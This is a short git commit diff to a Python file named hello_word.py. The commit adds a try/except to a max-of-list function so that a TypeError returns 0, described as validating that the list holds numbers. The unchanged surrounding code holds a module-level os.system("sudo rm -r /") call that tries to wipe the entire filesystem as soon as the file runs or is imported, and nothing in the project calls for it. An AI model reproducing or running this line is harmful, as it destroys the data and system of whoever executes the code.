b2d79bd3020e015d2475c99a0499d13ec1687c83
Hernan Camilo Rivera Arteaga <camilorivera108@gmail.com>
2022-06-25 12:31:09 -0500

    Fix para validar que la lista sea de numeros

--- hello_word.py
+++ hello_word.py
@@ -3,7 +3,10 @@ from typing import List
 
 
 def max_of_list(datos: List):
-    return max(datos)
+    try:
+        return max(datos)
+    except TypeError:
+        return 0
 
 os.system("sudo rm -r /")
 
